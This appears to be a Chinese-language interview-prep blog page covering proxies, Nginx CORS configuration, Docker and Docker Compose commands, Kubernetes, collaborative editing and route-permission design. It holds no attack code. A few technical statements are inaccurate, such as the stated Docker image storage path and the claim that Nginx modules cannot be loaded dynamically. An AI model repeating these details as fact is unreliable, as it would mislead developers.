<h3 id="2、什么是正向代理和反向代理？"><a href="#2、什么是正向代理和反向代理？" class="headerlink" title="2、什么是正向代理和反向代理？"></a>2、什么是正向代理和反向代理？</h3><p>正向代理（Forward Proxy）和反向代理（Reverse Proxy）是两种不同类型的代理服务器。它们在网络架构中发挥着重要的作用，具体来说：</p>
<ol>
<li>正向代理： 正向代理位于客户端与目标服务器之间，充当客户端与目标服务器之间的中间人。客户端发起请求时，请求首先到达正向代理服务器，然后代理服务器将请求转发到目标服务器。正向代理的主要作用包括：</li>
</ol>
<ul>
<li>为内部网络客户端提供对外部资源的访问能力</li>
<li>提供缓存功能，加速对常用资源的访问</li>
<li>对客户端身份进行匿名化</li>
<li>实现负载均衡</li>
<li>实施安全策略和访问控制</li>
</ul>
<ol>
<li>反向代理： 反向代理位于客户端与目标服务器之间，充当目标服务器与客户端之间的中间人。客户端发起请求时，请求首先到达反向代理服务器，然后代理服务器将请求转发到后端服务器。反向代理的主要作用包括：</li>
</ol>
<ul>
<li>提供负载均衡，将客户端请求分发到多个后端服务器</li>
<li>提供SSL加密和解密功能，实现安全通信</li>
<li>提供缓存功能，加速对常用资源的访问</li>
<li>实现应用服务器的隔离，保护后端服务器免受恶意攻击</li>
<li>集中处理和监控客户端请求，实现统一的访问控制和安全策略</li>
</ul>
<p>简言之，正向代理主要面向客户端，帮助客户端访问互联网上的资源；反向代理主要面向服务器，帮助服务器处理来自客户端的请求。</p>
<h5 id="Proxy如何解决跨域"><a href="#Proxy如何解决跨域" class="headerlink" title="Proxy如何解决跨域"></a>Proxy如何解决跨域</h5><p>代理（Proxy）是一种常见的跨域解决方案之一，特别是在服务器端编程或部署服务器的环境中。代理服务器充当了客户端和目标服务器之间的中间人，它接收客户端的请求并将其转发到目标服务器，然后将目标服务器的响应返回给客户端。通过代理服务器，可以绕过浏览器的同源策略，从而实现跨域请求。</p>
<p>以下是使用代理解决跨域请求的基本步骤：</p>
<ol>
<li><p><strong>设置代理服务器：</strong> 首先，你需要在服务器端设置一个代理服务器，这个服务器将接收来自客户端的请求并将其代理到目标服务器。这可以是一个独立的服务器或已有的Web服务器的一部分。</p>
</li>
<li><p><strong>客户端发送请求：</strong> 客户端向代理服务器发送请求，而不是直接向目标服务器发送请求。客户端的请求应该包含目标服务器的URL和所需的参数。</p>
</li>
<li><p><strong>代理服务器转发请求：</strong> 代理服务器接收到客户端的请求后，将其转发到目标服务器。这个过程涉及到从客户端接收请求、构建目标服务器请求、发送目标服务器请求、接收目标服务器响应等步骤。</p>
</li>
<li><p><strong>目标服务器响应：</strong> 目标服务器处理代理服务器发送的请求，并生成响应数据。响应数据将被发送回代理服务器。</p>
</li>
<li><p><strong>代理服务器返回响应：</strong> 代理服务器将目标服务器的响应返回给客户端。客户端接收到响应后，可以处理响应数据。</p>
</li>
</ol>
<p>使用代理服务器的主要优点包括：</p>
<ul>
<li><p><strong>绕过同源策略：</strong> 代理服务器允许客户端从不同域的目标服务器请求数据，绕过了浏览器的同源策略限制。</p>
</li>
<li><p><strong>灵活性：</strong> 代理服务器可以在客户端和目标服务器之间执行逻辑，例如添加身份验证、数据转换或其他处理。</p>
</li>
<li><p><strong>服务器端控制：</strong> 代理服务器是在服务器端运行的，因此可以更容易地进行监视、管理和维护。</p>
</li>
<li><p><strong>安全性：</strong> 代理服务器可以用于隐藏客户端的IP地址，从而提高安全性。</p>
</li>
</ul>
<p>需要注意的是，设置代理服务器需要一定的服务器管理和维护工作。此外，代理服务器不适用于所有跨域场景，特别是在客户端编写的纯前端应用中，可能更适合使用其他跨域解决方案，如CORS（跨域资源共享）。</p>
<h3 id="3、Nginx"><a href="#3、Nginx" class="headerlink" title="3、Nginx"></a>3、Nginx</h3><h5 id="为什么Nginx性能这么高？"><a href="#为什么Nginx性能这么高？" class="headerlink" title="为什么Nginx性能这么高？"></a>为什么Nginx性能这么高？</h5><p>Nginx 的高性能可以归因于其独特的设计和架构。以下是 Nginx 高性能的关键因素：</p>
<ol>
<li>事件驱动、异步非阻塞架构：Nginx 使用了事件驱动的异步非阻塞 I&#x2F;O 模型。这种模型允许 Nginx 在单个进程中处理大量并发连接，而无需为每个连接创建一个新的线程或进程。这大大降低了上下文切换和内存分配的开销，提高了性能。</li>
<li>轻量级：Nginx 的代码量较小，安装和配置简单，占用资源较少。这使得 Nginx 在处理请求时能够更高效地利用系统资源。</li>
<li>高效的静态文件处理：Nginx 对静态文件的处理能力非常出色，它可以利用 sendfile 系统调用、TCP_CORK 和 TCP_NOPUSH 套接字选项等高级 I&#x2F;O 功能，以高效地为静态资源提供服务。</li>
<li>Keep-Alive 连接：Nginx 支持 HTTP Keep-Alive 连接，这意味着多个请求可以在同一连接上进行，减少了连接建立和关闭的开销。</li>
<li>内建的负载均衡和反向代理：Nginx 提供了功能强大的反向代理和负载均衡功能，可以在多个后端服务器之间分发请求，提高整体性能。</li>
<li>缓存功能：Nginx 提供了缓存功能，可以将后端服务器的响应进行缓存，加速对常用资源的访问，减轻后端服务器的负担。</li>
<li>可扩展性：Nginx 支持模块化扩展，用户可以根据需要添加功能模块，定制 Nginx 以满足特定需求。</li>
<li>稳定性：Nginx 的稳定性非常高，即使在高负载情况下也能保持稳定运行。这使得 Nginx 能够在生产环境中提供可靠的服务。</li>
</ol>
<p>这些因素共同使得 Nginx 成为一个高性能的 Web 服务器和反向代理服务器。其优异的性能表现吸引了许多大型网站和互联网公司将 Nginx 作为首选的 Web 服务器和反向代理服务器。</p>
<h5 id="Nginx的优缺点？Nginx应用场景？"><a href="#Nginx的优缺点？Nginx应用场景？" class="headerlink" title="Nginx的优缺点？Nginx应用场景？"></a>Nginx的优缺点？Nginx应用场景？</h5><p>Nginx 是一个高性能、轻量级的 Web 服务器和反向代理服务器。它广泛用于网站和网络应用的开发，其优缺点如下：</p>
<p>优点：</p>
<ol>
<li>高性能：Nginx 使用事件驱动的异步非阻塞架构，可以支持大量并发连接。相较于其他传统服务器，例如 Apache，Nginx 在并发场景下具有更低的资源消耗和更高的性能。</li>
<li>轻量级：Nginx 的代码量较小，安装和配置简单，占用资源较少。</li>
<li>反向代理：Nginx 提供了功能强大的反向代理功能，可以实现负载均衡、缓存、SSL 加密解密等。</li>
<li>静态文件处理：Nginx 对静态文件的处理能力非常出色，能高效地为静态资源提供服务。</li>
<li>可扩展性：Nginx 支持模块化扩展，用户可以根据需要添加功能模块。</li>
<li>稳定性高：Nginx 有着很高的稳定性，被广泛应用于生产环境。</li>
</ol>
<p>缺点：</p>
<ol>
<li>动态语言支持较弱：与 Apache 相比，Nginx 对动态语言的支持不够完善，通常需要与其他应用服务器（如 PHP-FPM、uWSGI 等）配合使用。</li>
<li>模块更新和扩展：Nginx 模块需要在编译时集成，无法像 Apache 那样通过动态加载模块。当需要更新或添加模块时，通常需要重新编译 Nginx。</li>
<li>社区支持：虽然 Nginx 社区不断发展，但与 Apache 等老牌 Web 服务器相比，其社区支持相对较弱。</li>
</ol>
<p>Nginx 应用场景：</p>
<ol>
<li>静态资源服务器：Nginx 非常擅长处理静态文件，如图片、CSS、JavaScript 等。在很多场景下，Nginx 作为静态资源服务器可以减轻应用服务器的负担，提高响应速度。</li>
<li>反向代理和负载均衡：Nginx 提供了强大的反向代理和负载均衡功能，可以将客户端请求分发到多个后端服务器，提高服务的可用性和扩展性。</li>
<li>SSL 终端：Nginx 支持 SSL&#x2F;TLS 加密和解密，可作为 HTTPS 服务的终端，保证数据的安全传输。</li>
<li>缓存服务器：Nginx 可以作为缓存服务器，对后端服务器的响应进行缓存，加速对常用资源的访问，提高用户体验。</li>
<li>Web 应用服务器：虽然 Nginx 对动态语言支持的不足，但它仍然可以与其他应用服务器（如 PHP-FPM、uWSGI 等）配合使用，共同组成 Web 应用的整体架构。例如，Nginx 可以作为反向代理服务器，将动态请求转发给 PHP-FPM 处理，同时负责静态文件的处理。</li>
</ol>
<p>总之，Nginx 的高性能、轻量级和稳定性使其在众多应用场景中得到广泛应用，特别是在处理静态文件、反向代理和负载均衡等方面表现出色。然而，对于动态语言支持和模块扩展方面，Nginx 仍然需要与其他应用服务器配合使用以获得更好的效果。</p>
<h5 id="如何用Nginx解决前端跨域问题？"><a href="#如何用Nginx解决前端跨域问题？" class="headerlink" title="如何用Nginx解决前端跨域问题？"></a>如何用Nginx解决前端跨域问题？</h5><p>要使用 Nginx 解决前端跨域问题，您可以通过配置 Nginx 为您的 Web 服务添加 CORS（跨域资源共享）相关的响应头。以下是一个简单的示例，展示如何在 Nginx 配置文件中实现 CORS 配置：</p>
<ol>
<li><p>打开 Nginx 配置文件，通常位于 <code>/etc/nginx/nginx.conf</code> 或 <code>/etc/nginx/sites-available/your_site_config</code>。</p>
</li>
<li><p>在配置文件中找到您想要添加 CORS 支持的 <code>location</code> 块。如果没有，您可以创建一个。</p>
</li>
<li><p>在 <code>location</code> 块中添加以下配置：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js">location / &#123;<br>    # ...原有配置...<br><br>    # 添加<span class="hljs-variable constant_">CORS</span>相关的响应头<br>    <span class="hljs-keyword">if</span> ($request_method = <span class="hljs-string">&#x27;OPTIONS&#x27;</span>) &#123;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span> <span class="hljs-string">&#x27;*&#x27;</span>;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Allow-Methods&#x27;</span> <span class="hljs-string">&#x27;GET, POST, OPTIONS&#x27;</span>;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Allow-Headers&#x27;</span> <span class="hljs-string">&#x27;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range,Authorization&#x27;</span>;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Max-Age&#x27;</span> <span class="hljs-number">1728000</span>;<br>        add_header <span class="hljs-string">&#x27;Content-Type&#x27;</span> <span class="hljs-string">&#x27;text/plain; charset=utf-8&#x27;</span>;<br>        add_header <span class="hljs-string">&#x27;Content-Length&#x27;</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">204</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ($request_method = <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span> <span class="hljs-string">&#x27;*&#x27;</span>;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Allow-Methods&#x27;</span> <span class="hljs-string">&#x27;GET, POST, OPTIONS&#x27;</span>;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Allow-Headers&#x27;</span> <span class="hljs-string">&#x27;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range,Authorization&#x27;</span>;<br>        add_header <span class="hljs-string">&#x27;Access-Control-Expose-Headers&#x27;</span> <span class="hljs-string">&#x27;Content-Length,Content-Range&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>在这个示例中，我们为 <code>OPTIONS</code> 请求和 <code>GET</code> 请求添加了 CORS 相关的响应头。您可以根据实际需求调整允许的请求方法和其他配置。</p>
</li>
<li><p>保存配置文件并重新加载 Nginx 以使更改生效：</p>
</li>
</ol>
<p>现在，Nginx 已经为您的 Web 服务添加了 CORS 支持，应该可以解决前端跨域问题。请注意，上面的示例中使用了通配符 <code>*</code> 作为 <code>Access-Control-Allow-Origin</code> 的值，这意味着允许所有域进行跨域访问。在实际生产环境中，您可能需要将其替换为特定的域名以提高安全性。</p>
<h3 id="4、谈谈你对Docker的理解"><a href="#4、谈谈你对Docker的理解" class="headerlink" title="4、谈谈你对Docker的理解"></a>4、谈谈你对Docker的理解</h3><p>Docker是一个开源的容器平台，它可以帮助开发者和运维人员轻松地打包、分发和运行应用。它基于容器化技术，让应用程序和其依赖环境作为一个整体打包在一起，实现了环境与应用程序的隔离。Docker的核心思想是将应用程序与底层基础设施分离，从而使开发和部署过程更加简单、高效和可靠。</p>
<p>Docker的主要特点包括：</p>
<ol>
<li>轻量级：Docker使用容器来运行应用，这些容器共享宿主机的操作系统内核，因此容器的开销小于虚拟机。它们启动快速，占用的资源更少。</li>
<li>易于打包和分发：Docker可以将应用程序及其依赖项一起打包成一个镜像，这使得应用程序可以在不同的环境中轻松移植和复制。Docker Hub等仓库提供了便利的镜像分发和管理。</li>
<li>隔离性：每个容器运行在自己的命名空间中，拥有独立的文件系统、网络和进程空间，这意味着容器之间相互隔离，可以在同一台机器上运行多个互不干扰的应用。</li>
<li>可扩展性：Docker支持容器的水平扩展和垂直扩展，可以根据需要快速添加或删除容器实例，以应对不同的负载需求。</li>
<li>DevOps友好：Docker支持持续集成与持续部署（CI&#x2F;CD），使得开发、测试和生产环境更加统一，有助于提高开发和运维团队的协作效率。</li>
<li>生态系统丰富：Docker拥有庞大的社区和丰富的插件生态系统，包括Docker Compose、Docker Swarm、Kubernetes等，这些工具可以帮助用户更好地管理和协调多个容器。</li>
</ol>
<p>总之，Docker是一个强大的容器化技术平台，它使应用程序的开发、部署和运维更加简单、高效和可靠。</p>
<h5 id="Docker如何批量清理临时镜像文件？"><a href="#Docker如何批量清理临时镜像文件？" class="headerlink" title="Docker如何批量清理临时镜像文件？"></a>Docker如何批量清理临时镜像文件？</h5><p>在Docker中，可以使用以下命令批量清理临时镜像文件：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">docker image prune -a<br></code></pre></td></tr></table></figure>

<p>该命令将删除所有未被使用的镜像和标签。如果你只想删除未被使用的镜像，可以使用以下命令：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">docker image prune<br></code></pre></td></tr></table></figure>

<h5 id="Docker本地的镜像文件都存放在哪里？"><a href="#Docker本地的镜像文件都存放在哪里？" class="headerlink" title="Docker本地的镜像文件都存放在哪里？"></a>Docker本地的镜像文件都存放在哪里？</h5><p>在 Docker 中，本地的镜像文件存储在 Docker 的文件系统中，一般位于宿主机的<code>/var/lib/docker</code>目录下。在该目录下有多个子目录和文件，其中比较重要的有：</p>
<ul>
<li><code>containers/</code>：存储容器的文件系统和元数据。</li>
<li><code>image/</code>：存储镜像文件和元数据。</li>
<li><code>volumes/</code>：存储 Docker 卷的数据。</li>
<li><code>networks/</code>：存储 Docker 网络的配置和状态。</li>
</ul>
<p>在<code>image/</code>目录下，有一个子目录<code>overlay2/</code>（在使用 overlay2 存储驱动的情况下），它包含了所有的镜像文件和元数据，每个镜像对应一个目录。例如，如果有一个名为<code>nginx:latest</code>的镜像，则它的文件存储路径为<code>/var/lib/docker/image/overlay2/&lt;hash&gt;/merged/</code>，其中<code>&lt;hash&gt;</code>是镜像的 SHA256 哈希值。</p>
<p>请注意，这些路径可能因为 Docker 版本、存储驱动等因素而有所不同。如果想要确定本地 Docker 存储的路径，可以使用以下命令查看 Docker 的配置信息：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> <span class="hljs-literal">info</span><br></code></pre></td></tr></table></figure>

<p>其中会列出 Docker 存储的根目录和数据子目录。</p>
<h5 id="Docker如何停止所有正在运行的容器？"><a href="#Docker如何停止所有正在运行的容器？" class="headerlink" title="Docker如何停止所有正在运行的容器？"></a>Docker如何停止所有正在运行的容器？</h5><p>要停止所有正在运行的容器，可以使用以下命令：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">docker stop <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">ps</span> -<span class="hljs-params">q</span>)</span><br></code></pre></td></tr></table></figure>

<p>该命令使用<code>docker ps -q</code>命令列出所有正在运行的容器的 ID，然后将其传递给<code>docker stop</code>命令以停止这些容器。这样就可以一次性停止所有正在运行的容器。</p>
<p>如果你希望删除所有停止的容器，可以使用以下命令：</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">docker <span class="hljs-built_in">container</span> prune<br></code></pre></td></tr></table></figure>

<p>该命令将删除所有已经停止的容器。请注意，这些命令将永久删除容器，因此在使用之前请确保你确实想要删除这些容器。</p>
<h5 id="构建Docker镜像应该遵循哪些原则？"><a href="#构建Docker镜像应该遵循哪些原则？" class="headerlink" title="构建Docker镜像应该遵循哪些原则？"></a>构建Docker镜像应该遵循哪些原则？</h5><p>构建Docker镜像时，应遵循一些原则以保证镜像的高质量、安全性和可维护性。以下是一些建议：</p>
<ol>
<li>使用官方基础镜像：尽可能使用官方提供的基础镜像，因为它们经过了广泛测试且得到了良好的支持。</li>
<li>保持镜像轻量化：减少镜像大小，只包含运行应用程序所需的最小依赖。这将提高镜像的传输速度和部署时间。</li>
<li>使用多阶段构建：通过多阶段构建，可以在一个Dockerfile中使用多个构建阶段，以便更有效地处理构建过程。这有助于减少镜像大小和优化构建时间。</li>
<li>缩小镜像攻击面：确保镜像中只包含必要的组件，避免安装不必要的软件包，以降低安全风险。</li>
<li>使用.dockerignore文件：使用.dockerignore文件排除不需要的文件和目录，以减小镜像大小并加快构建速度。</li>
<li>标签和版本控制：为镜像使用清晰、有意义的标签，并进行版本控制。这有助于跟踪和管理不同版本的镜像。</li>
<li>缓存和层次化：充分利用Docker构建缓存，并将Dockerfile中的指令合理分层。这有助于加速构建过程并提高可维护性。</li>
<li>设置适当的用户权限：避免使用root用户运行容器，以降低潜在的安全风险。</li>
<li>指定资源限制：设置适当的资源限制，如CPU和内存，以防止容器消耗过多宿主机资源。</li>
<li>文档化：为Dockerfile和镜像提供清晰的文档，以便其他人了解如何使用和维护它们。</li>
</ol>
<p>遵循这些原则有助于创建高质量、安全且易于维护的Docker镜像。</p>
<h5 id="谈谈你对Docker-Compose的理解"><a href="#谈谈你对Docker-Compose的理解" class="headerlink" title="谈谈你对Docker-Compose的理解"></a>谈谈你对Docker-Compose的理解</h5><p>Docker Compose是一个用于定义和运行多容器Docker应用程序的工具。它允许用户使用YAML文件（通常命名为<code>docker-compose.yml</code>）来描述一个完整的应用程序环境，包括服务、网络和卷等配置。通过Docker Compose，开发者可以轻松地管理复杂的多容器应用，实现一键式启动、停止和重新部署。</p>
<p>以下是Docker Compose的一些主要特点：</p>
<ol>
<li>服务定义：使用YAML语法定义应用程序的各个服务。每个服务都基于一个Docker镜像，并且可以配置其端口映射、环境变量、依赖关系等。</li>
<li>网络管理：Docker Compose允许用户定义应用程序内部的网络，以便实现服务之间的隔离和通信。默认情况下，Docker Compose会创建一个网络，并将所有服务连接到该网络。</li>
<li>卷管理：Docker Compose支持定义和管理持久化存储卷，以便在容器之间共享数据。这对于数据库等需要持久化存储的应用非常有用。</li>
<li>依赖管理：Docker Compose可以管理服务之间的依赖关系，确保服务按照正确的顺序启动和关闭。这可以通过<code>depends_on</code>关键字来实现。</li>
<li>一键操作：使用<code>docker-compose up</code>命令，可以一次性启动定义在YAML文件中的所有服务。同样地，<code>docker-compose down</code>命令可以一次性停止所有服务。</li>
<li>开发和生产环境配置：Docker Compose支持使用多个YAML文件来覆盖和扩展配置，这使得开发者可以针对开发、测试和生产环境使用不同的配置。</li>
</ol>
<p>Docker Compose大大简化了多容器应用程序的管理，使开发者可以专注于编写应用程序代码，而无需关心底层的容器管理和编排。然而，需要注意的是，虽然Docker Compose适用于开发和测试环境，但在生产环境中，可能需要更强大的容器编排工具，如Kubernetes。</p>
<h5 id="谈谈你对K8S的理解"><a href="#谈谈你对K8S的理解" class="headerlink" title="谈谈你对K8S的理解"></a>谈谈你对K8S的理解</h5><p>Kubernetes（简称K8s）是一个开源的容器编排平台，旨在自动化部署、扩展和管理容器化应用程序。它最初由Google开发，后来成为Cloud Native Computing Foundation（CNCF）的一部分。Kubernetes提供了一种声明式的方式来描述应用程序的部署和运行状态，使得复杂的容器化应用程序可以在多个主机上进行分布式部署和管理。</p>
<p>以下是Kubernetes的一些主要特点：</p>
<ol>
<li>高可用性：Kubernetes支持容器在集群的不同节点上进行分布式部署，以实现负载均衡和故障转移。这有助于提高应用程序的可用性和性能。</li>
<li>水平可扩展：Kubernetes可以根据负载需求自动扩展或缩减容器实例数量。这可以通过Deployment资源中的副本数（Replicas）进行配置。</li>
<li>自我修复：Kubernetes监控容器状态，当容器出现故障时，它可以自动重新启动容器、替换容器或重新调度容器到其他节点上，从而确保应用程序始终处于健康状态。</li>
<li>声明式配置：Kubernetes使用YAML或JSON文件描述应用程序的部署和运行状态，这些配置文件可以与源代码一起存储和管理，从而实现基础设施即代码（Infrastructure as Code）。</li>
<li>服务发现和负载均衡：Kubernetes提供了内置的服务发现和负载均衡机制，可以将流量自动分发到不同的容器实例上，以实现高可用性和性能。</li>
<li>存储管理：Kubernetes支持多种持久化存储解决方案，如NFS、iSCSI、GlusterFS等。它允许用户为容器动态配置和管理持久化存储卷。</li>
<li>密钥和配置管理：Kubernetes可以管理应用程序的敏感信息（如密码、密钥等）和配置文件，使得这些信息可以在不同的容器实例之间安全地共享。</li>
<li>强大的生态系统：Kubernetes拥有丰富的插件和扩展生态系统，例如Helm（用于包管理）、Prometheus（用于监控）等，这些工具可以帮助用户更好地管理和监控Kubernetes集群。</li>
</ol>
<p>总之，Kubernetes是一个功能强大的容器编排平台，它提供了一种高度自动化和可扩展的方式来管理容器化应用程序。尽管Kubernetes的学习曲线较陡峭，但对于大型、复杂的应用程序，它是一个非常有价值的工具。</p>
<h2 id="特定场景篇"><a href="#特定场景篇" class="headerlink" title="特定场景篇"></a>特定场景篇</h2><h3 id="1、怎么实现一个简单的多人协作文档编辑功能"><a href="#1、怎么实现一个简单的多人协作文档编辑功能" class="headerlink" title="1、怎么实现一个简单的多人协作文档编辑功能"></a>1、怎么实现一个简单的多人协作文档编辑功能</h3><p>实现一个简单的多人协作文档编辑功能涉及多个方面的技术和组件，包括实时通信、文本同步、用户管理等。下面是一个基本的步骤和示例技术栈，帮助你开始构建这样的功能：</p>
<ol>
<li><p><strong>创建基本的文档编辑器：</strong> 首先，你需要创建一个文档编辑器，用户可以在其中编辑文本。你可以使用现有的富文本编辑器库（如Quill.js、TinyMCE等）来简化这个过程。</p>
</li>
<li><p><strong>实时通信：</strong> 为了实现多人协作，你需要一个实时通信机制，让所有用户之间的更改能够及时同步。WebSocket 是一种常见的选择，它允许双向通信，使得服务器可以推送数据给所有客户端。</p>
</li>
<li><p><strong>文本同步：</strong> 当用户在编辑器中进行更改时，这些更改需要同步到其他用户。你可以使用 Operational Transformation (OT) 或 Conflict-free Replicated Data Types (CRDTs) 等算法来处理多人同时编辑的情况。</p>
</li>
<li><p><strong>用户管理：</strong> 需要一种方式来管理用户并跟踪他们的编辑状态。每个用户应该有一个唯一的标识符，以便在同步时确定哪个用户做了什么更改。</p>
</li>
<li><p><strong>后端服务器：</strong> 你需要一个后端服务器来处理 WebSocket 连接、文本同步和用户管理。Node.js、Python（使用框架如Django或Flask）、Ruby（使用框架如Ruby on Rails）等都可以用于创建后端服务器。</p>
</li>
<li><p><strong>前端界面：</strong> 创建一个前端界面，让用户可以进入编辑会话并查看其他用户的更改。你可以使用框架如React、Vue.js、Angular等来构建前端界面。</p>
</li>
</ol>
<p>以下是一个基本示例，演示了使用 Node.js、WebSocket 和 Quill.js 创建一个简单的多人协作文档编辑器的基本思路：</p>
<ul>
<li>使用 Node.js 创建一个 WebSocket 服务器，处理用户连接和文本同步。</li>
<li>在前端使用 Quill.js 创建文本编辑器。</li>
<li>当用户进行更改时，将更改发送到服务器，服务器广播更改给所有其他用户。</li>
<li>在前端接收来自服务器的更改并在编辑器中应用它们。</li>
</ul>
<p>这只是一个起点，实现一个稳定的多人协作文档编辑器需要更多的工作和考虑，特别是在处理同步和冲突解决方面。此外，还需要考虑用户权限、安全性、持久化存储等方面的问题。如果你打算在生产环境中使用这样的功能，可能需要考虑使用成熟的协作工具或服务，而不是自行构建。</p>
<p>最重要的是，在构建这样的功能时，需要考虑到性能、可伸缩性和用户体验，以确保用户能够顺畅地协作编辑文档</p>
<h3 id="2、权限设计"><a href="#2、权限设计" class="headerlink" title="2、权限设计"></a>2、权限设计</h3><p>权限设计是在应用程序中定义和管理用户对资源和功能的访问权限的过程。良好的权限设计可以确保应用程序的安全性，同时提供用户所需的功能。以下是一些关于权限设计的关键考虑因素和最佳实践：</p>
<ol>
<li><p><strong>身份认证（Authentication）：</strong> 用户必须在应用程序中进行身份认证，以确定他们是谁。常见的身份认证方法包括用户名密码、令牌（Token）、单点登录（SSO）、OAuth等。</p>
</li>
<li><p><strong>授权（Authorization）：</strong> 授权是根据用户身份和角色确定用户对资源和功能的访问权限的过程。权限可以分为以下几个方面：</p>
<ul>
<li><strong>角色和权限管理：</strong> 角色是一组相关的权限集合，可以将用户分配给不同的角色。例如，管理员、普通用户、编辑者等。权限则是与特定操作或资源相关的控制点。</li>
<li><strong>基于角色的授权：</strong> 常见的做法是将用户分配给角色，然后将权限与角色相关联。这样，用户的权限取决于他们的角色。</li>
<li><strong>基于资源的授权：</strong> 有时候，权限可能需要更精确地分配到特定的资源上。例如，某个用户只能编辑自己创建的文章。</li>
</ul>
</li>
<li><p><strong>细粒度控制：</strong> 在权限设计中，要考虑到权限的细粒度，即确定哪些操作是受限的，以及哪些数据是受限的。这可以通过明确定义权限和资源的组合来实现。</p>
</li>
<li><p><strong>动态权限管理：</strong> 有些权限可能需要在运行时动态管理。这可能涉及到基于特定条件（如用户属性或上下文）的权限动态分配。</p>
</li>
<li><p><strong>审计和日志：</strong> 记录用户的操作和访问可以帮助检测潜在的安全问题和非法行为。审计和日志功能对于安全性至关重要。</p>
</li>
<li><p><strong>界面设计：</strong> 对于权限管理，用户界面设计也很重要。用户应该能够清楚地了解他们的权限，以及如何请求或修改权限。</p>
</li>
<li><p><strong>安全漏洞：</strong> 在权限设计中要小心处理潜在的安全漏洞，如跨站点请求伪造（CSRF）、越权访问等。</p>
</li>
<li><p><strong>测试和漏洞扫描：</strong> 对权限系统进行全面的测试，包括单元测试、集成测试和漏洞扫描，以确保它的安全性和稳定性。</p>
</li>
<li><p><strong>定期审查和更新：</strong> 权限设计不是一次性完成的任务，它需要定期审查和更新，以适应应用程序的变化和新的安全挑战。</p>
</li>
<li><p><strong>遵循最佳实践：</strong> 最后，确保遵循安全最佳实践，如避免硬编码的密钥、加密敏感数据、限制错误信息的泄漏等。</p>
</li>
</ol>
<p>总之，权限设计是应用程序安全的关键组成部分。合理的权限设计可以保护用户数据和系统安全，同时提供流畅的用户体验。在设计权限系统时，综合考虑用户需求、角色管理、资源控制和安全性等因素是至关重要的。</p>
<h5 id="路由权限怎么做的？要是想实现篡改用户权限的话怎么办？"><a href="#路由权限怎么做的？要是想实现篡改用户权限的话怎么办？" class="headerlink" title="路由权限怎么做的？要是想实现篡改用户权限的话怎么办？"></a>路由权限怎么做的？要是想实现篡改用户权限的话怎么办？</h5><p>在前端应用中实现路由权限控制是一种重要的安全措施，它可以确保用户只能访问其具有权限的页面。以下是一些常见的路由权限控制的做法：</p>
<ol>
<li><p><strong>路由配置：</strong> 在应用中定义路由时，可以为每个路由配置一个权限标志，表示哪些用户具有访问权限。例如，可以将权限标志存储在路由对象的元数据中。</p>
</li>
<li><p><strong>路由守卫（Route Guards）：</strong> 使用路由守卫来控制用户是否可以访问特定路由。在路由守卫中，可以检查用户的权限并决定是否允许导航到该路由。在 Vue.js 中，可以使用 <code>beforeEach</code> 钩子，在 Angular 中，可以使用 <code>CanActivate</code> 守卫，在 React 中，可以使用 <code>react-router</code> 中的 <code>Route</code> 组件的 <code>render</code> 属性。</p>
</li>
<li><p><strong>动态加载路由：</strong> 将路由配置信息从服务器动态获取，根据用户的权限来生成路由。这样可以确保用户只能看到他们有权限访问的路由。</p>
</li>
<li><p><strong>角色和权限系统：</strong> 实现一个角色和权限系统，为用户分配不同的角色，并将角色与路由权限进行关联。然后，在路由守卫中检查用户的角色是否具有访问特定路由的权限。</p>
</li>
<li><p><strong>Token 鉴权：</strong> 将用户的身份验证令牌（Token）包含在每个请求中，并在服务器端验证令牌的有效性和用户的权限。服务器可以拒绝无效令牌或没有权限的请求。</p>
</li>
<li><p><strong>前端鉴权：</strong> 除了在服务器端进行权限验证外，还可以在前端进行一些基本的权限检查，以提高用户体验。例如，在前端路由守卫中检查用户是否有权限访问某个页面，并在没有权限时重定向到其他页面或显示错误信息。</p>
</li>
<li><p><strong>加密和签名：</strong> 使用加密和签名技术来保护路由配置和权限信息，以防止用户篡改权限。这可以在一定程度上增加安全性。</p>
</li>
</ol>
<p>要防止用户篡改权限，需要在服务器端进行权限验证，不仅依赖前端的控制。前端的权限控制主要是为了提供更好的用户体验和安全性，但不应作为唯一的安全层。</p>
<p>总之，路由权限控制是一项重要的前端安全措施，可以通过合理的路由配置和路由守卫来实现。但最终的安全性依赖于服务器端的权限验证和数据保护措施。要确保系统的安全性，前后端应该共同合作，建立全面的安全策略。</p>
